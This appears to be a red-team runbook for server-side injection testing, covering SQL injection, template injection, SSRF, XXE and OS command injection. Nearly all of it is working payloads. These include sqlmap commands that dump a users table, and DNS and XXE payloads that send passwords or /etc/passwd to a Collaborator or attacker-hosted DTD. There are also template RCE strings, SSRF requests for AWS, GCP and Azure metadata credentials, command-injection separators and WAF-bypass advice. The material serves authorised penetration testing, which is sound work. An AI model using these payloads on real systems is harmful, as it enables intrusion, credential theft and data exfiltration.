# Runbook: Server-side injection testing

Injection flaws occur when user-supplied input is incorporated into a server-side operation
without adequate separation between data and instruction. The attack surface is any endpoint
that processes input and produces output derived from a backend operation: database queries,
template rendering, file system operations, outbound HTTP requests, and OS command execution.

Out-of-band testing is essential. Many injection vulnerabilities produce no visible response
difference. Without an OOB detection channel, this entire class of vulnerability is invisible.

## Prerequisites

- Complete endpoint and parameter inventory from the recon runbook.
- Burp Suite Pro with Burp Collaborator enabled.
- sqlmap, ffuf.
- All parameters identified by Arjun and Param Miner.

## Phase 1: SQL injection

### Detection

For every parameter that appears to query a database, test for error-based response
differences:

```bash
# Boolean difference
curl "https://target.com/items?id=1"     # baseline response
curl "https://target.com/items?id=1'"    # single quote: syntax error or empty response?
curl "https://target.com/items?id=1 AND 1=1"   # should match baseline
curl "https://target.com/items?id=1 AND 1=2"   # should differ from baseline
```

For time-based blind injection when responses look identical:

```bash
# MySQL
curl "https://target.com/items?id=1 AND SLEEP(5)"
# PostgreSQL
curl "https://target.com/items?id=1; SELECT pg_sleep(5)"
# MSSQL
curl "https://target.com/items?id=1; WAITFOR DELAY '0:0:5'"
```

### Exploitation with sqlmap

Once a parameter is confirmed injectable, use sqlmap with appropriate configuration:

```bash
# Basic extraction
sqlmap -u "https://target.com/items?id=1" --dbs

# POST request
sqlmap -u "https://target.com/api/search" \
  --data '{"query":"test"}' \
  --headers "Authorization: Bearer TOKEN" \
  --dbs --level 3 --risk 2

# Enumerate tables and dump
sqlmap -u "https://target.com/items?id=1" -D target_db --tables
sqlmap -u "https://target.com/items?id=1" -D target_db -T users --dump
```

### Blind and out-of-band extraction

Where the response carries no data and no error, extract one bit at a time. With a visible
boolean difference, confirm a known-true condition and contrast a false one, then walk the
data character by character:

```
... AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
```

Where there is no boolean difference but errors are distinguishable, make the error
conditional:

```
... AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END)
```

Where neither response nor error differs, fall back to time (the time-based payloads above)
or to an out-of-band channel. OOB is the most reliable on a firewalled target: trigger a DNS
lookup to Collaborator and smuggle the stolen value into the subdomain.

```sql
-- Oracle
... ||(SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % e SYSTEM "http://'||(SELECT password FROM users WHERE rownum=1)||'.COLLAB/">%e;]>'),'/r') FROM dual)
-- MSSQL
... ;exec master..xp_dirtree '//'+(SELECT TOP 1 password FROM users)+'.COLLAB/a'
```

### Filter bypass

Where a WAF or input filter blocks the obvious payload, encode it past the filter while
keeping it valid for the backend. XML endpoints are a frequent gap: wrap the injection in an
XML entity or hex/HTML encoding so the filter sees inert text and the parser decodes it back
to SQL before the query runs.

## Phase 2: SSTI

Template injection produces results when the server evaluates a mathematical expression
inside a template syntax. Probe with expressions that produce visible output differences:

```
# Generic probe (works in several engines)
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
${7*'7'}
```

If any of these return `49` or `7777777` in the response, the parameter is vulnerable.

Fingerprint the template engine by the payload that worked and the output format:
- Jinja2/Twig: `{{7*'7'}}` returns `7777777`
- Freemarker: `${7*7}` returns `49`
- Smarty: `{php}echo 7*7;{/php}`

For confirmed SSTI, attempt remote code execution:

```
# Jinja2 (Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity (Java)
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke(...)
```

Where the engine runs in a sandbox, the route to RCE is an escape: reach an unsanctioned
class through reflection, or read an exposed object's attributes for information disclosure
where execution is blocked. Documentation for the identified engine usually names the
built-in objects worth probing.

## Phase 3: SSRF

SSRF vulnerabilities occur in parameters that the server uses to make outbound HTTP requests:
image URLs, webhook endpoints, feed parsers, document importers, and URL preview features.

### OOB detection (always start here)

```bash
# Use Burp Collaborator payload in URL parameters
curl "https://target.com/api/fetch?url=https://YOUR_COLLABORATOR_PAYLOAD"
curl "https://target.com/preview?src=https://YOUR_COLLABORATOR_PAYLOAD"
```

Check the Collaborator for DNS lookups and HTTP requests. Any interaction confirms SSRF even
if the response to the original request shows nothing.

### Internal network probing

Once SSRF is confirmed, probe internal services:

```bash
# AWS metadata service
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP metadata service
curl "https://target.com/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure metadata service
curl "https://target.com/api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Phase 4: XXE

XXE vulnerabilities are exploitable in endpoints that parse XML input. This includes direct
XML requests, SOAP endpoints, SVG image uploads, and document formats that contain XML
(DOCX, XLSX, PDF with XML forms).

### OOB exfiltration

Replace or augment the application's XML with an entity that triggers an OOB request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://YOUR_COLLABORATOR_PAYLOAD"> ]>
<userInfo>
  <username>&xxe;</username>
</userInfo>
```

### Local file read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<userInfo>
  <username>&xxe;</username>
</userInfo>
```

### Blind XXE via parameter entities

Where the parser blocks general entities or returns nothing, parameter entities and an
attacker-hosted DTD carry the data out of band. Host a malicious DTD that reads a file and
appends it to an OOB request, then reference it:

```xml
<!-- request -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://COLLAB/evil.dtd"> %xxe;]>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://COLLAB/?x=%file;'>">
%eval;
%exfil;
```

### Error-based and XInclude

Where OOB egress is blocked, provoke a parser error that embeds the file contents in the
error message. Where the request is not a full XML document but the server embeds user input
into one server-side, use XInclude instead of a DOCTYPE:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

XML lurks in more than obvious XML endpoints: SVG uploads, DOCX/XLSX, and SOAP all parse it,
so test those upload and import paths too.

## Phase 5: OS command injection

OS command injection occurs in parameters used to construct shell commands: filename
parameters, diagnostic tools, utility wrappers, and any feature that mentions "processing"
or "conversion".

### Time-based detection

```bash
# Test with a time delay (baseline then with payload)
curl "https://target.com/api/convert?file=document.pdf"
curl "https://target.com/api/convert?file=document.pdf;sleep+5"
curl "https://target.com/api/convert?file=document.pdf|sleep 5"
curl "https://target.com/api/convert?file=document.pdf%0asleep%205"
```

### OOB detection

```bash
# DNS lookup to Collaborator confirms execution
curl "https://target.com/api/ping?host=YOUR_COLLABORATOR_PAYLOAD"
curl "https://target.com/api/ping?host=;nslookup+YOUR_COLLABORATOR_PAYLOAD"
```

### Output redirection

Where the command runs but its output is never returned and no OOB egress is available,
redirect the output to a file inside the web root, then fetch it:

```bash
curl "https://target.com/api/ping?host=;id>/var/www/static/out.txt"
curl "https://target.com/static/out.txt"
```

Separator and encoding variants matter when the input is partly filtered: try `;`, `|`,
`&&`, `` `cmd` ``, `$(cmd)`, and newline (`%0a`) until one survives.

## Output

- SQL injection findings: injectable parameters, database type, accessible data.
- SSTI findings: affected template engine, RCE demonstrated where possible.
- SSRF findings: confirmed OOB interaction, internal services accessible.
- XXE findings: OOB confirmed, any local file content extracted.
- OS command injection findings: confirmed execution, demonstrated impact.

## Techniques

- [SQL injection](../techniques/sqli.md)
- [SSRF](../techniques/ssrf.md)
- [SSTI](../techniques/ssti.md)
- [XXE injection](../techniques/xxe.md)

## Counter moves

Runbook: Server-side injection testing is the case here. The durable answers are server-side validation, authorisation, and dependency hygiene. Defenders' notes on this are under [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
